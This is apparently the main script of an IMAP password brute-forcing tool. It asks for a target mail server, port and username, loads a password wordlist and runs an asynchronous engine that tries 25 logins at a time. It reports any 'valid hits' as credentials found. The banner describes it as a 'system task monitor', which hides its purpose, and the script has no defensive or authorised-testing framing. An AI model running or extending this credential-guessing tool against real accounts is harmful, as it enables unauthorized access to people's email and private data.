import asyncio
import sys
from modules.loader import load_wordlist
from modules.engine import run_engine

# ANSI Color Codes for Futuristic Cyber/Neon Terminal Aesthetic
CYAN = "\033[96m"
GREEN = "\033[92m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
RED = "\033[91m"
BLUE = "\033[94m"
RESET = "\033[0m"
BOLD = "\033[1m"

BANNER = f"""{CYAN}{BOLD}
  _        ____   ____ _____ _   _ _____ _   _  ____ 
 | |      / __ \ / ___|_   _| | | |_   _| \ | |/ ___|
 | |     / / _` | |  _  | | | |_| | | | |  \| | |  _ 
 | |___ | | (_| | |_| | | | |  _| | | | | |\  | |_| |
 |_____| \ \__,_|\____| |_| |_| |_| |_| |_| \_|\____|
          \\____/                                     
{RESET}"""

def main():
    print(BANNER)
    print(f"{MAGENTA}{'=' * 53}{RESET}")
    print(f"{BOLD}{CYAN}          SYSTEM TASK MONITOR & MONITORING ENGINE{RESET}")
    print(f"{MAGENTA}{'=' * 53}{RESET}")
    
    print(f"\n{YELLOW}{'=' * 53}{RESET}")
    print(f"{BOLD}{YELLOW}         INTERACTIVE RECONNAISSANCE PROMPT{RESET}")
    print(f"{YELLOW}{'=' * 53}{RESET}")
    
    # Prompt interactively for target details
    server = input(f"{CYAN}[?] Enter Target Host/IP (e.g., imap.example.com): {RESET}").strip()
    if not server:
        print(f"{RED}[!] Target host cannot be empty. Exiting.{RESET}")
        sys.exit(1)
        
    try:
        port_input = input(f"{CYAN}[?] Enter Target Port [Default: 993]: {RESET}").strip()
        port = int(port_input) if port_input else 993
    except ValueError:
        port = 993

    user = input(f"{CYAN}[?] Enter Target Username/Email: {RESET}").strip()
    if not user:
        print(f"{RED}[!] Target username cannot be empty. Exiting.{RESET}")
        sys.exit(1)

    targets = [{"server": server, "port": port, "user": user}]

    print(f"\n{BLUE}[INFO] Loading wordlist dictionary...{RESET}")
    try:
        passwords = load_wordlist("config/passwords.txt")
    except Exception as e:
        print(f"{RED}[!] Error loading wordlist: {e}{RESET}")
        sys.exit(1)

    print(f"{GREEN}[*] Target Configured : {server}:{port} (User: {user}){RESET}")
    print(f"{GREEN}[*] Loaded Dictionary : {len(passwords)} entries{RESET}")
    print(f"{BOLD}{MAGENTA}[*] Starting high-speed asynchronous execution pipeline...\n{RESET}")

    # Run the engine and display real-time background processing
    start_time = asyncio.get_event_loop().time()
    valid_hits, duration = asyncio.run(run_engine(targets, passwords, concurrency_limit=25))
    
    print(f"\n{MAGENTA}{'=' * 53}{RESET}")
    print(f"{CYAN}[*] Scan completed in {duration:.2f} seconds.{RESET}")
    if valid_hits:
        print(f"{GREEN}{BOLD}[+] Success! Found {len(valid_hits)} valid configuration(s).{RESET}")
    else:
        print(f"{YELLOW}[-] Scan finished. No matching credentials identified.{RESET}")
    print(f"{MAGENTA}{'=' * 53}{RESET}")

if __name__ == "__main__":
    main()
